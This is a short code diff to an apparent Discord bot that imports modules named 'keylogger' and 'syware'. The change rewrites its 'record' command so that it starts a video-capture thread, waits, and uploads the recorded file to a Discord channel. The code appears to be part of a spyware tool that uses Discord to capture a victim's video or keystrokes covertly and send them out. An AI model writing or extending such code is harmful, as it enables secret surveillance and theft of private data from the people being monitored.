@@ -6,6 +6,7 @@ import os
 import dotenv
 import keylogger as key 
 import syware as video
+from asyncio import sleep
 from Rouxls.main_rouxls import run_animation
 import multiprocessing
 
@@ -77,7 +78,10 @@ async def record(ctx):
         recorder = video.videotake()
         recorder.checkpath()
         recorder.start_video_thread()
-        await ctx.send(file=discord.File(f"takensend/video/Video {recorder.datetime}.avi"))
+        existe = recorder.checkvideo()
+        await sleep(12)
+        if existe:
+            await ctx.send(file=discord.File(f"takensend/video/video.avi"))
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
